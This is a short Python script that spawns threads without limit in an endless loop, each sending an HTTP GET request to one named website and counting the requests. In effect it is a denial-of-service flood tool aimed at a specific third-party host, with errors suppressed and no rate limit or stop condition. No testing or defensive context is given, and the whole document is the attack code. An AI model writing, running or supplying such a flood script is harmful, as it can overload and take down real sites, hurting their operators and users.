import requests
from threading import Thread

count = 0


class RequestHandler(Thread):
    def __init__(self, url):
        super().__init__()
        self.url = url

    def run(self):
        try:
            rsp = requests.get(self.url)
            global count
            count += 1
            if count % 10000 == 0:
                print('request over: %d' % count)

        except BaseException:
            pass


if __name__ == '__main__':
    while True:
        RequestHandler('http://ifree.top').start()
